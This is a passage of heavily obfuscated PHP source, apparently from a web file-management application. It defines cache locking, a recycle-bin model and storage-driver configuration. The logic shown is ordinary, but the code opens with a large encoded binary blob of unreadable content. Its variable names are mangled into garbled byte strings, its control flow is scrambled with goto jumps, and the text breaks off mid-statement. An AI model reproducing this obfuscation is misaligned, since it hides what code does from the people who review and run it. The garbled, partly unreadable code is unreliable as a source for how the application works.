f\xaa\x88\x1\xc6\x3c\xad\x85\xb5\x25\x57\x87\x62\x94\x70\xb3\x6\x88\xda\xb8\x55\x71\x12\x25\xa2"."\x68\xea\xeb\x89\x3e\x26\xcc\xef\x86\xac\x57\x73\xcc\xc5\x65\x1e\xa6\xca\xa9\x7e\x21\x19\x95\xa2\x1e\x42\xc0\x2f\x34\x48\xf2\x71\x63\x6c\x94\x8c\x25\xda\x9e\x3e\xd9\xa4\x17\x5c\xf6".base64_decode('Uu0WDkK4yIsh2PHm39XwKyThyKfFIAvCca0tXkD+HNvJffx6htO88Th7mdKS')."\x95\xbd\x4c\xcf\x62\x41\xc\x7f\xc4\x12\x52\x38\x82\x8d\x23\x57\x98\x55\xfa\xed\x8f\xa5\xb9\x44\xbb\x48\x4b\xc6\xfc\x58\x6e\x3\x69\x1f\x17\xda\xb\x2c\x9e\xdc\x92\x65\x4\xd5\x2"."\2\55\74\12\173\320\145\132\47\2\343\0\265\273\271\72\12\356\43\143\213\171\223\126\123\115\226\215\55\6\310\203\164\351\235\226\130\33\53\4\205\14\364\174\266".base64_decode('JRnia5rWizeRTxfWVkn5herES7lhC4QKN8LBzTrFgpErT6CnkGaZfAGLsYGR')."\x9c\x41\x31\xd1\xd2\x1d\xfb\xd2\x22\x2a\x9e\xc3\x25\x8e\x4c\x23\x39\xa6\x8b\xca\x85\xf3\xf3\x2b\xb6\xde\x8b\x5\xec\x23\xc3\x25\x8c\x7e\xd5\x8c\x25\xf3\xe3\xf5\xbc\x79\x23\x75\x15".strrev('™/6X$âË”x²–Ñ™ÖzpÅ‚£Ü@­a÷—y3p"WŠvm:a½’î').strrev('¡iÛoùÁ{…ò1Ê€G7ç3Ÿ7³Š÷`0/_ò/ÃÎS9B„').base64_decode('XhTMPGwvCjxVSxxdFcCTNKUAZuS36fk4mKcVuNvHdcLzVfS2UiBZVBQorEoQ')."\x2c\xb8\xbb\xd\xeb\x1d\xbf\x2d\x5e\x9c\x18\xae\x22\x44\x94\x86\x7a\x32\xd4\x16\x3\x14\xe7\x6a\x57\x50\xab\x92\xbd\x61\xca\xea\xa3\xd4\x95\x4d\x47\x95\xc2\x5e\x26\x27\xa8\x4b\x16"."\124\162\165\240\27\256\363\230\313\224\114\205\327\202\176\60\146\51\64\123\215\11\212\104\366\67\275\161\72\155\44\45\310\304\154\342\50\316\200\133\56\220\13\10\154"."\120\24\241\245\270\34\330\242\70\215\17\147\42\0\307\367\140\365\360\122\224\335\175\100\336\307\201\317\74\234\14\37\31\167\300\264\260\226\105\277\165\232\151\122\124"."\1\130\162\224\23\121\140\360\340\162\10\112\4\340\213\137\164\300\131\104\262\167\4\157\10\57\240\117\162\43\7\271\301\220\202\123\21\66\261\4\240\114\237\5\304"."\163\211\134\243\65\346\154\167\201\74\2\160\170\235\332\0\365\122\6\155\67\171\177\370\323\247\262\235\312\342\127\371\4\336\104\225\10\144\61\153\270\161\212\233\270".strrev('u'."\n".'Í©/(p¡}³½Qé$H;°*òV¿€ªg¶ûRË¶wHEÄœ:¢u}')."\4\202\15\330\173\144\136\62\52\45\150\237\344\45\265\65\7\132\207\113\363\266\170\174\376\274\64\250\215\322\32\345\216\155\160\222\257\15\365\322\343\367\7\72\206".base64_decode('64WvfgbvCbrt5PLobFKjwmUqtg/JKcroCqZeSpp7OOJlrPy7uK4GdfXFPqw+')."\326\155\212\141\24\140\111\105\120\223\244\225\324\35\244\117\311\100\157\232\154\163\63\112\26\15\110\263\51\254\343\373\134\227\345\22\130\210\107\233\5\241\30\1\10".base64_decode('xeMTRYwtOGOiSDNfxI5S+YzAnk7XiO5St9YpiNAxY0FsrsgcC+pD+Jsk/x/n')."\xca\xf9\xdb\x75\x9b\x0\x0", 10, -8))); goto eÂ›ƒ¼Î¶‰; d‡ËÒ©í: class CacheLockMemcached { public function lock($B™„í²ò®Ú, $A—›ºÉ±Œ¯ = 0) { $fßâÛ›êòÈ = Cache::init(); $AÊ‘»±˜õ = microtime(!0) + $A—›ºÉ±Œ¯; while (microtime(!0) < $AÊ‘»±˜õ) { $d©Ø´Ñä’ç = $fßâÛ›êòÈ->get($B™„í²ò®Ú); if (!$d©Ø´Ñä’ç || $d©Ø´Ñä’ç < microtime(!0)) { $EÓèÕ±£Â = $fßâÛ›êòÈ->handle->add($B™„í²ò®Ú, $AÊ‘»±˜õ, $A—›ºÉ±Œ¯); if ($EÓèÕ±£Â) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($FÂ„·£æ¹†) { return Cache::init()->get($FÂ„·£æ¹†); } public function unlock($cŸßÍéåŠ) { return Cache::init()->remove($cŸßÍéåŠ); } } class CacheLockDatabase { public function lock($AÎ…»×¿»‹, $Dæ’±¡´ó‹ = 0) { $föÚÒíÚ¥ = Model($_SERVER[ÉóçÄÇ][780]); $Eİ¬ÖÄ¿¶Ğ = microtime(!0) + $Dæ’±¡´ó‹; while (microtime(!0) < $Eİ¬ÖÄ¿¶Ğ) { $e±¯¶ïâ…¸ = $föÚÒíÚ¥->get($AÎ…»×¿»‹); if (!$e±¯¶ïâ…¸ || $e±¯¶ïâ…¸ < microtime(!0)) { $E¶ªÇçù®í = $föÚÒíÚ¥->set($AÎ…»×¿»‹, $Eİ¬ÖÄ¿¶Ğ); if ($E¶ªÇçù®í) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C÷Ë»Ö¤™) { return Model($_SERVER[ÉóçÄÇ][780])->get($C÷Ë»Ö¤™); } public function unlock($Dæ²àìÇ‘) { Model($_SERVER[ÉóçÄÇ][780])->remove($Dæ²àìÇ‘); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($c—† É×©, $dí²†Ó È¿) { $DÈŒã‰Ã =& $_SERVER[ÉóçÄÇ]; if (!class_exists($DÈŒã‰Ã[807])) { show_json($DÈŒã‰Ã[808], !1); } $this->cacheTime = $dí²†Ó È¿; $this->handle = new Memcached(); if (is_array($c—† É×©[$DÈŒã‰Ã[809]]) && count($c—† É×©[$DÈŒã‰Ã[809]]) >= 1) { foreach ($c—† É×©[$DÈŒã‰Ã[809]] as $FæÙ·×‚‡¬) { $FèŸ¥ÊÖØ = explode($DÈŒã‰Ã[4], $FæÙ·×‚‡¬); $this->handle->addServer($FèŸ¥ÊÖØ[0], $FèŸ¥ÊÖØ[1]); } } else { $this->handle->addServer($c—† É×©[$DÈŒã‰Ã[175]], $c—† É×©[$DÈŒã‰Ã[176]]); } } public function set($e¨ô•Âë—Ï, $b±Òµ´ŸŒ, $DêÅò¸ŞÏÏ = false) { $DêÅò¸ŞÏÏ = $DêÅò¸ŞÏÏ ? $DêÅò¸ŞÏÏ : $this->cacheTime; return $this->handle->set($e¨ô•Âë—Ï, $b±Òµ´ŸŒ, $DêÅò¸ŞÏÏ); } public function get($BŠ„‡Ö˜Å¯) { return $this->handle->get($BŠ„‡Ö˜Å¯); } public function remove($b“Ï…É´±×) { return $this->handle->delete($b“Ï…É´±×); } public function deleteAll() { return $this->handle->flush(); } } goto F›¶„åõìÉ; Bê¸¨ÀœÊï: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65\137\x72\145\143\171\143\154\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\x54\151\x6d\145", "\164\151\155\x65", "\x69\156\x73\145\x72\x74", "\146\x75\x6e\x63\164\x69\x6f\x6e")); public function listData($E¼…ìØçÃÅ = false) { $cÃ¼ö—Â£ =& $_SERVER[ÉóçÄÇ]; $E¼…ìØçÃÅ = $E¼…ìØçÃÅ ? $E¼…ìØçÃÅ : USER_ID; $C¸ºÙ™æ†¯ = $this->where(array($cÃ¼ö—Â£[1503] => $E¼…ìØçÃÅ))->select(); return array_to_keyvalue($C¸ºÙ™æ†¯, $cÃ¼ö—Â£[33], $cÃ¼ö—Â£[390]); } public function moveToRecycle($cØêö³Úê) { goto Cô¾ÔŸƒğ£; B©åù…Ç¤: if (!$FÚš™©Üßõ || $FÚš™©Üßõ[$eéô¾÷©ô[417]] == $eéô¾÷©ô[86]) { return; } $d¯»¬Ê¨Ê = array($eéô¾÷©ô[404] => $cØêö³Úê, $eéô¾÷©ô[1503] => USER_ID, $eéô¾÷©ô[544] => $FÚš™©Üßõ[$eéô¾÷©ô[398]], $eéô¾÷©ô[545] => $FÚš™©Üßõ[$eéô¾÷©ô[478]], $eéô¾÷©ô[548] => $FÚš™©Üßõ[$eéô¾÷©ô[481]]); $this->add($d¯»¬Ê¨Ê); goto CŸ°œ†”¡ñ; Cô¾ÔŸƒğ£: $eéô¾÷©ô =& $_SERVER[ÉóçÄÇ]; $D®ôŞ¹½» = Model($eéô¾÷©ô[1186]); $FÚš™©Üßõ = $D®ôŞ¹½»->sourceInfo($cØêö³Úê); goto B©åù…Ç¤; CŸ°œ†”¡ñ: $this->recycleMove($cØêö³Úê, 1); if ($FÚš™©Üßõ[$eéô¾÷©ô[397]] == $eéô¾÷©ô[86]) { $EŒİ¿µÂ¬‘ = array($eéô¾÷©ô[548] => array($eéô¾÷©ô[507], $FÚš™©Üßõ[$eéô¾÷©ô[481]] . $cØêö³Úê . $eéô¾÷©ô[508])); $D®ôŞ¹½»->where($EŒİ¿µÂ¬‘)->setField($eéô¾÷©ô[417], 1); } goto b‡Ú¢ÎÙÆœ; b‡Ú¢ÎÙÆœ: } public function clear() { $this->remove(!1); } public function remove($aŞÍè½»Ÿ— = false) { goto E‚Äùñãª; CÂÅˆ¶–Ø: $aŞÍè½»Ÿ— = $aŞÍè½»Ÿ— === !1 ? !1 : $aŞÍè½»Ÿ—; $d÷ª´ÉÅÆ = array(); foreach ($dóñ­÷™Ú as $Eİ‡Õá…ŠÆ) { if ($aŞÍè½»Ÿ— != !1 && !in_array($Eİ‡Õá…ŠÆ, $aŞÍè½»Ÿ—)) { continue; } $b¨Å×ÓÒ—µ = $aòôİ‹ò‰‰->sourceInfo($Eİ‡Õá…ŠÆ); $aòôİ‹ò‰‰->remove($Eİ‡Õá…ŠÆ, !1); $bÓ™Ì®È = $b¨Å×ÓÒ—µ[$e¾Ì¶ƒÀ‡…[398]] . $e¾Ì¶ƒÀ‡…[70] . $b¨Å×ÓÒ—µ[$e¾Ì¶ƒÀ‡…[478]]; $d÷ª´ÉÅÆ[$bÓ™Ì®È] = array($e¾Ì¶ƒÀ‡…[544] => $b¨Å×ÓÒ—µ[$e¾Ì¶ƒÀ‡…[398]], $e¾Ì¶ƒÀ‡…[478] => $b¨Å×ÓÒ—µ[$e¾Ì¶ƒÀ‡…[478]]); $this->where(array($e¾Ì¶ƒÀ‡…[390] => $Eİ‡Õá…ŠÆ))->delete(); } goto AÃö…Â›ìÒ; E‚Äùñãª: $e¾Ì¶ƒÀ‡… =& $_SERVER[ÉóçÄÇ]; $aòôİ‹ò‰‰ = Model($e¾Ì¶ƒÀ‡…[1186]); $dóñ­÷™Ú = $this->listData(); goto CÂÅˆ¶–Ø; AÃö…Â›ìÒ: foreach ($d÷ª´ÉÅÆ as $b‡‰ ÙŸÊå) { $aòôİ‹ò‰‰->targetSpaceUpdate($b‡‰ ÙŸÊå[$e¾Ì¶ƒÀ‡…[398]], $b‡‰ ÙŸÊå[$e¾Ì¶ƒÀ‡…[478]]); } goto D¶Šé»„¼; D¶Šé»„¼: } public function restore($cÁöå°ä = false) { $a´†·åÎ•Î = $this->listData(); $this->_restoreSource($a´†·åÎ•Î, $cÁöå°ä); } public function restoreUserAll($Cå¥Ú¼¬Òø) { $f³¦Î¸¨ù× = $this->listData($Cå¥Ú¼¬Òø); $this->_restoreSource($f³¦Î¸¨ù×, !1); } private function _restoreSource($AòØ´®Áå, $d¢ƒÄÇá‰) { goto a «Æ™•ñ; CÄãõ §Çó: if (!$AòØ´®Áå) { return !0; } $a¼Ö´¬”’¢ = array(); foreach ($AòØ´®Áå as $b’‰§ƒ×†) { goto AÙœÌ×ÊìŠ; AÙœÌ×ÊìŠ: if ($d¢ƒÄÇá‰ != !1 && !in_array($b’‰§ƒ×†, $d¢ƒÄÇá‰)) { continue; } $F‹éÇ„ùØ = $AëÜ¦á§Œ->sourceInfo($b’‰§ƒ×†); $d‹Ñ°…ç¦ = $AëÜ¦á§Œ->sourceInfo($F‹éÇ„ùØ[$eÜ·ºÏÚÆë[472]]); goto f­¬…„î’ˆ; f­¬…„î’ˆ: if ($d‹Ñ°…ç¦[$eÜ·ºÏÚÆë[417]] == $eÜ·ºÏÚÆë[86]) { continue; } $AëÜ¦á§Œ->lockMoveStart($b’‰§ƒ×†); $this->recycleMove($b’‰§ƒ×†, 0); goto e²Ú¡ ‹Ò; e²Ú¡ ‹Ò: if ($F‹éÇ„ùØ[$eÜ·ºÏÚÆë[397]] == $eÜ·ºÏÚÆë[86]) { $C«œÈ½µ­’ = array($eÜ·ºÏÚÆë[548] => array($eÜ·ºÏÚÆë[507], $F‹éÇ„ùØ[$eÜ·ºÏÚÆë[481]] . $b’‰§ƒ×† . $eÜ·ºÏÚÆë[508])); $AëÜ¦á§Œ->where($C«œÈ½µ­’)->setField($eÜ·ºÏÚÆë[417], 0); $this->restoreFolderChildren($b’‰§ƒ×†, $AòØ´®Áå); } $this->where(array($eÜ·ºÏÚÆë[390] => $b’‰§ƒ×†))->delete(); $AëÜ¦á§Œ->folderSizeReset($F‹éÇ„ùØ[$eÜ·ºÏÚÆë[472]]); goto d…÷Õ¿õÎ¥; d…÷Õ¿õÎ¥: $a¼Ö´¬”’¢[] = $F‹éÇ„ùØ[$eÜ·ºÏÚÆë[472]]; if ($F‹éÇ„ùØ[$eÜ·ºÏÚÆë[397]] == $eÜ·ºÏÚÆë[86]) { $a¼Ö´¬”’¢[] = $b’‰§ƒ×†; } $AëÜ¦á§Œ->lockMoveEnd($b’‰§ƒ×†); goto d‰Ø¿Æ±×¡; d‰Ø¿Æ±×¡: } goto B»Ê–èĞÜÃ; a «Æ™•ñ: $eÜ·ºÏÚÆë =& $_SERVER[ÉóçÄÇ]; $AëÜ¦á§Œ = Model($eÜ·ºÏÚÆë[1186]); $d¢ƒÄÇá‰ = $d¢ƒÄÇá‰ == !1 ? !1 : $d¢ƒÄÇá‰; goto CÄãõ §Çó; B»Ê–èĞÜÃ: $AëÜ¦á§Œ->updateModifyTime($a¼Ö´¬”’¢); goto Då“‹®øÄ; Då“‹®øÄ: } private function restoreFolderChildren($bØäËç†¤—, $BÚÃ¬¬¤˜˜) { goto C…‹óÈÔ¦Æ; Bä»Èªôƒ…: foreach ($BÚÃ¬¬¤˜˜ as $Aì½ ïø¥Æ) { if ($Aì½ ïø¥Æ == $bØäËç†¤—) { continue; } if (!$DšŸåìÁÆ->isParentOf($bØäËç†¤—, $Aì½ ïø¥Æ)) { continue; } $cñÕéŒµò = $DšŸåìÁÆ->sourceInfo($Aì½ ïø¥Æ); if ($cñÕéŒµò[$fÑ¼ºí³ÉÉ[397]] == $fÑ¼ºí³ÉÉ[86]) { $Bº‡´Â¹­[] = array($fÑ¼ºí³ÉÉ[548] => array($fÑ¼ºí³ÉÉ[507], $cñÕéŒµò[$fÑ¼ºí³ÉÉ[481]] . $Aì½ ïø¥Æ . $fÑ¼ºí³ÉÉ[508])); } else { $Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[390]][1][] = $Aì½ ïø¥Æ; } } if (!$Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[390]][1]) { unset($Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[390]]); } if (!$Bº‡´Â¹­) { return; } goto aˆÃŞ‚ÚçÚ; C…‹óÈÔ¦Æ: $fÑ¼ºí³ÉÉ =& $_SERVER[ÉóçÄÇ]; $DšŸåìÁÆ = Model($fÑ¼ºí³ÉÉ[1186]); $Bº‡´Â¹­ = array($fÑ¼ºí³ÉÉ[390] => array($fÑ¼ºí³ÉÉ[7], array())); goto Bä»Èªôƒ…; aˆÃŞ‚ÚçÚ: $Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[390]][1] = array_unique($Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[390]][1]); $Bº‡´Â¹­[$fÑ¼ºí³ÉÉ[939]] = $fÑ¼ºí³ÉÉ[1762]; $DšŸåìÁÆ->where($Bº‡´Â¹­)->setField($fÑ¼ºí³ÉÉ[417], 1); goto BÉ¶©æ‹; BÉ¶©æ‹: } private function recycleMove($b†‘°¢òÉ, $Bñâ°ëô¿Ÿ = 1) { $B½×Ôœí† =& $_SERVER[ÉóçÄÇ]; $fİ™Ÿá·É = Model($B½×Ôœí†[1186]); $CæÚåÏµ‰× = Model($B½×Ôœí†[1970]); $C©ÍğÔ˜İÚ = array($B½×Ôœí†[390] => $b†‘°¢òÉ); if ($Bñâ°ëô¿Ÿ) { $fİ™Ÿá·É->where($C©ÍğÔ˜İÚ)->setField($B½×Ôœí†[417], 1); $CæÚåÏµ‰×->eventRecycle($b†‘°¢òÉ, $B½×Ôœí†[1971]); } else { $aò¤Èº× = $fİ™Ÿá·É->where($C©ÍğÔ˜İÚ)->find(); $bÊµ×ñ¶´„ = $aò¤Èº×[$B½×Ôœí†[397]] == $B½×Ôœí†[86]; $f´Û…—´Ñ“ = $fİ™Ÿá·É->fileNameAuto($aò¤Èº×[$B½×Ôœí†[472]], $aò¤Èº×[$B½×Ôœí†[28]], REPEAT_RENAME_FOLDER, $bÊµ×ñ¶´„); if ($f´Û…—´Ñ“ != $aò¤Èº×[$B½×Ôœí†[28]]) { $fİ™Ÿá·É->rename($b†‘°¢òÉ, $f´Û…—´Ñ“); } $fİ™Ÿá·É->where($C©ÍğÔ˜İÚ)->setField($B½×Ôœí†[417], 0); $CæÚåÏµ‰×->eventRecycle($b†‘°¢òÉ, $B½×Ôœí†[1972]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\x2e\163\164\157\x72\x61\x67\x65\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\163\x69\x7a\145\x4d\x61\170", "\163\x79\x73\164\x65\x6d", "\144\x65\146\141\x75\154\x74", "\144\x72\x69\x76\145\x72", "\x63\x6f\156\x66\x69\x67"); public function listData($e¼ØÀÂÍ = false, $B‰ù§ˆøµ = "\x6d\x6f\x64\151\x66\171\124\x69\x6d\145", $bÆÅ„Ì©ìƒ = false) { $AôºĞƒ‰¥œ =& $_SERVER[ÉóçÄÇ]; $f‰ÁãÈĞ†Ó = parent::listData($e¼ØÀÂÍ, $B‰ù§ˆøµ, $bÆÅ„Ì©ìƒ); if ($e¼ØÀÂÍ) { return $f‰ÁãÈĞ†Ó; } $A±È¿Ú±÷¯ = $this->ioSizeUseGet(array_to_keyvalue($f‰ÁãÈĞ†Ó, $AôºĞƒ‰¥œ[33], $AôºĞƒ‰¥œ[388])); foreach ($f‰ÁãÈĞ†Ó as $c¸Š’¥í => $B‰×”»¶‡) { unset($f‰ÁãÈĞ†Ó[$c¸Š’¥í][$AôºĞƒ‰¥œ[6]]); $f‰ÁãÈĞ†Ó[$c¸Š’¥í][$AôºĞƒ‰¥œ[1660]] = isset($A±È¿Ú±÷¯[$B‰×”»¶‡[$AôºĞƒ‰¥œ[388]]]) ? $A±È¿Ú±÷¯[$B‰×”»¶‡[$AôºĞƒ‰¥œ[388]]] : 0; } return $f‰ÁãÈĞ†Ó; } public function ioSizeUseGet($F¾µÅ‘Ëå) { goto F¼ƒÄÙ£è; F¼ƒÄÙ£è: $a™›“Å–§ø =& $_SERVER[ÉóçÄÇ]; if (!$F¾µÅ‘Ëå) { return array(); } $añ•Ëá±ª = $a™›“Å–§ø[1973] . implode($a™›“Å–§ø[47], $F¾µÅ‘Ëå); goto EêÚ×¸©é¬; Eó³èßÕ°: Cache::set($añ•Ëá±ª, $Cªø²×Ü×³, 60); return $Cªø²×Ü×³; goto F›ğŠÅ‹¾Ú; bæ…®ƒÆ: $b…àÃèíÓ‡ = array($a™›“Å–§ø[769] => array($a™›“Å–§ø[7], $F¾µÅ‘Ëå)); $Cªø²×Ü×³ = Model($a™›“Å–§ø[740])->field($CÁö’ã³Î†)->where($b…àÃèíÓ‡)->group($a™›“Å–§ø[769])->select(); $Cªø²×Ü×³ = array_to_keyvalue($Cªø²×Ü×³, $a™›“Å–§ø[388], $a™›“Å–§ø[77]); goto Eó³èßÕ°; EêÚ×¸©é¬: $Cªø²×Ü×³ = Cache::get($añ•Ëá±ª); if ($Cªø²×Ü×³) { return $Cªø²×Ü×³; } $CÁö’ã³Î† = array($a™›“Å–§ø[769] => $a™›“Å–§ø[388], $a™›“Å–§ø[1974] => $a™›“Å–§ø[77]); goto bæ…®ƒÆ; F›ğŠÅ‹¾Ú: } public function getConfig($fì‹‡©Ç®Š) { $d¯…¹ÓÜŠ = parent::listData($fì‹‡©Ç®Š); return json_decode($d¯…¹ÓÜŠ[$_SERVER[ÉóçÄÇ][6]], !0); } public function update($FÍ”ÃóÌØ, $CöÔ¯¬á¥È) { goto bïÖÍµ„©¢; bïÖÍµ„©¢: $FÚÁ¡á‚± =& $_SERVER[ÉóçÄÇ]; $A®¥²¤²ò„ = $CöÔ¯¬á¥È[$FÚÁ¡á‚±[28]]; $EÇƒ–°”‡” = array_to_keyvalue(parent::listData(), $FÚÁ¡á‚±[28]); goto FÀÖè®×¾Î; a„ÔÉ¢Š‡ä: $D‡ˆ•ÒÃÑ = parent::update($FÍ”ÃóÌØ, $CöÔ¯¬á¥È); if ($D‡ˆ•ÒÃÑ && $CöÔ¯¬á¥È[$FÚÁ¡á‚±[34]]) { foreach ($EÇƒ–°”‡” as $Dƒ«„‹¢ŒÇ) { if ($Dƒ«„‹¢ŒÇ[$FÚÁ¡á‚±[34]] && $Dƒ«„‹¢ŒÇ[$FÚÁ¡á‚±[388]] != $FÍ”ÃóÌØ) { parent::update($Dƒ«„‹¢ŒÇ[$FÚÁ¡á‚±[388]], array($FÚÁ¡á‚±[34] => 0)); } } } return $D‡ˆ•ÒÃÑ; goto C¦¸˜­ñ˜; FÀÖè®×¾Î: if (isset($EÇƒ–°”‡”[$A®¥²¤²ò„]) && $EÇƒ–°”‡”[$A®¥²¤²ò„][$FÚÁ¡á‚±[388]] != $FÍ”ÃóÌØ) { return !1; } if (isset($CöÔ¯¬á¥È[$FÚÁ¡á‚±[1975]]) && $CöÔ¯¬á¥È[$FÚÁ¡á‚±[1975]] == $FÚÁ¡á‚±[86]) { $this->checkConfig($CöÔ¯¬á¥È); } unset($CöÔ¯¬á¥È[$FÚÁ¡á‚±[1975]]); goto a„ÔÉ¢Š‡ä; C¦¸˜­ñ˜: } public function add($FõÜŒÖè») { goto CÔŞâÌ‰…¯; b’Ûë®Û„: $this->checkConfig($FõÜŒÖè»); $A°Ü›‰×„Š = parent::insert($FõÜŒÖè»); if ($A°Ü›‰×„Š && $FõÜŒÖè»[$eÄÊÏ«¿¤[34]]) { foreach ($BŠ¼ÇØ•” as $fÄ¬ç£ì´») { if ($fÄ¬ç£ì´»[$eÄÊÏ«¿¤[34]]) { parent::update($fÄ¬ç£ì´»[$eÄÊÏ«¿¤[388]], array($eÄÊÏ«¿¤[34] => 0)); } } } goto fğ¼½­‘‘; fğ¼½­‘‘: return $A°Ü›‰×„Š; goto B˜«ÕŠ°ä†; CÔŞâÌ‰…¯: $eÄÊÏ«¿¤ =& $_SERVER[ÉóçÄÇ]; $BŠ¼ÇØ•” = array_to_keyvalue(parent::listData(), $eÄÊÏ«¿¤[28]); if (isset($BŠ¼ÇØ•”[$FõÜŒÖè»[$eÄÊÏ«¿¤[28]]])) { return !1; } goto b’Ûë®Û„; B˜«ÕŠ°ä†: } public function checkConfig(&$C×ä¼‡˜¥œ) { goto Bä¾µ§¸ÍÇ; f¥Ëè„Öñî: $f‚“ñèâ¢ = new $FŸªƒ³îšŸ($aÙ·¥ì³¡¦); if (in_array($b„çÈÜñÚŠ, $f‚“ñèâ¢->objectDriver)) { if (!$f‚“ñèâ¢->isBucketCors() && !$f‚“ñèâ¢->setBucketCors()) { $B¦‡ßëá¤ = LNG($D¡àô­æ‘[1980]); $B¦‡ßëá¤ .= $D¡àô­æ‘[1981] . LNG($D¡àô­æ‘[1982]); show_json($B¦‡ßëá¤, !1); } } $eµìÍÛ±Šö = rtrim($aÙ·¥ì³¡¦[$D¡àô­æ‘[1058]], $D¡àô­æ‘[8]) . $D¡àô­æ‘[8]; goto d°‘Ö¼ª‚â; d°‘Ö¼ª‚â: $eí–ºÓÜ›Š = $f‚“ñèâ¢->getPath($eµìÍÛ±Šö . $D¡àô­æ‘[1119]); if (!$f‚“ñèâ¢->mkfile($eí–ºÓÜ›Š)) { show_json(LNG($D¡àô­æ‘[1980]), !1); } $aÙ·¥ì³¡¦[$D¡àô­æ‘[1058]] = $eµìÍÛ±Šö; goto bÒ±ğŒâäİ; bÒ±ğŒâäİ: $C×ä¼‡˜¥œ[$D¡àô­æ‘[6]] = json_encode($aÙ·¥ì³¡¦); $C×ä¼‡˜¥œ[$D¡àô­æ‘[93]] = $CŒù”Ö±•Ä; return !0; goto DÍ•ƒŒ¹Óë; C¤÷§†Ûï : foreach ($aÙ·¥ì³¡¦ as $Cá¤ÖŠËã => $D Àùõœğå) { $aÙ·¥ì³¡¦[$Cá¤ÖŠËã] = trim($D Àùõœğå); } $aÙ·¥ì³¡¦[$D¡àô­æ‘[1976]] = rand_string(6); $AºÂ”ïæÎ¦ = $GLOBALS[$D¡àô­æ‘[6]][$D¡àô­æ‘[87]][$D¡àô­æ‘[777]]; goto c‹ƒ×½ÖÁ; c‹ƒ×½ÖÁ: $CŒù”Ö±•Ä = isset($AºÂ”ïæÎ¦[$b„çÈÜñÚŠ]) ? $AºÂ”ïæÎ¦[$b„çÈÜñÚŠ] : ucfirst($b„çÈÜñÚŠ); $FŸªƒ³îšŸ = $D¡àô­æ‘[71] . $CŒù”Ö±•Ä; if (!$CŒù”Ö±•Ä || !class_exists($FŸªƒ³îšŸ)) { write_log(array($D¡àô­æ‘[1977], $C×ä¼‡˜¥œ, get_caller_info()), $D¡àô­æ‘[1978]); show_json(LNG($D¡àô­æ‘[1979]), !1, $C×ä¼‡˜¥œ); } goto f¥Ëè„Öñî; Bä¾µ§¸ÍÇ: $D¡àô­æ‘ =& $_SERVER[ÉóçÄÇ]; $b„çÈÜñÚŠ = strtolower($C×ä¼‡˜¥œ[$D¡àô­æ‘[93]]); $aÙ·¥ì³¡¦ = json_decode($C×ä¼‡˜¥œ[$D¡àô­æ‘[6]], !0); goto C¤÷§†Ûï ; DÍ•ƒŒ¹Óë: } public function driverListSystem() { $fê±åÈœçÑ =& $_SERVER[ÉóçÄÇ]; $F£Š§™‘…Í = parent::listData(); $aÊ¨©Çİ»Å = array(); foreach ($F£Š§™‘…Í as $d™“‹…ßŠŠ) { unset($d™“‹…ßŠŠ[$fê±åÈœçÑ[192]], $d™“‹…ßŠŠ[$fê±åÈœçÑ[83]]); $d™“‹…ßŠŠ[$fê±åÈœçÑ[6]] = json_decode($d™“‹…ßŠŠ[$fê±åÈœçÑ[6]], !0); $aÊ¨©Çİ»Å[] = $d™“‹…ßŠŠ; } return $aÊ¨©Çİ»Å; } public function defaultDriver() { $Bñ²ä«ŒÛÎ =& $_SERVER[ÉóçÄÇ]; $F“§ˆ”ˆ˜ = parent::listData(); $c‚ÄÚê×• = array_filter_by_field($F“§ˆ”ˆ˜, $Bñ²ä«ŒÛÎ[34], 1); $c‚ÄÚê×• = $c‚ÄÚê×•[0]; if ($c‚ÄÚê×•) { $c‚ÄÚê×•[$Bñ²ä«ŒÛÎ[6]] = json_decode($c‚ÄÚê×•[$Bñ²ä«ŒÛÎ[6]], !0); } return $c‚ÄÚê×•; } public function driverInfo($bñ‰Ç³Ø) { $EòêäëŠáÕ =& $_SERVER[ÉóçÄÇ]; $e¬‰…ÙÜë¸ = array_to_keyvalue(parent::listData(), $EòêäëŠáÕ[388]); if (!isset($e¬‰…ÙÜë¸[$bñ‰Ç³Ø])) { return !1; } $A·é¥¤‚¸è = $e¬‰…ÙÜë¸[$bñ‰Ç³Ø]; $A·é¥¤‚¸è[$EòêäëŠáÕ[6]] = json_decode($A·é¥¤‚¸è[$EòêäëŠáÕ[6]], !0); return $A·é¥¤‚¸è; } public function remove($BÄ¸ğĞÍö¾) { $this->removeShareItems($BÄ¸ğĞÍö¾); return parent::remove($BÄ¸ğĞÍö¾); } public function removeWithFile($cªÒ¯¦á¤à, $EÉÍ¿¯Òâ) { goto aÄÃÕø„ğİ; aÄÃÕø„ğİ: $eõ¿÷¢‡ç =& $_SERVER[ÉóçÄÇ]; $F„‹†ƒ‡ßÃ = array($eõ¿÷¢‡ç[769] => $cªÒ¯¦á¤à); $Cä‘¾ÔóÜÄ = Model($eõ¿÷¢‡ç[444])->where($F„‹†ƒ‡ßÃ)->count(); goto FÂòßÕˆÈ ; e©öà¡ÃÈä: if (!$e¯–ĞÜ‹…È) { $B‰Ï„Ê°¡Ğ->stop($d°¥¥ĞğÚê); return !1; } $B‰Ï„Ê°¡Ğ->end(); if ($EÉÍ¿¯Òâ == $eõ¿÷¢‡ç[1640]) { $this->remove($cªÒ¯¦á¤à); } goto bêÍ¿ÁÀ¯¬; Cê„¹À ¬½: $aÀ´Ã™›µÔ = Model($eõ¿÷¢‡ç[173])->where($F„‹†ƒ‡ßÃ)->field($eõ¿÷¢‡ç[1985])->select(); foreach ($aÀ´Ã™›µÔ as $EØ¦ğ¼Áñï) { goto BÉá«¯İÜ; F–›ªë¤¨•: $b¬÷ïî®ğÆ = array($eõ¿÷¢‡ç[769] => $d¡¾æèóà‘, $eõ¿÷¢‡ç[75] => $eŒ‰œ“ó); Model($eõ¿÷¢‡ç[173])->where($F„‹†ƒ‡ßÃ)->save($b¬÷ïî®ğÆ); goto E¥òËäÇù; BÉá«¯İÜ: $Eà×¦ÁçäŒ = 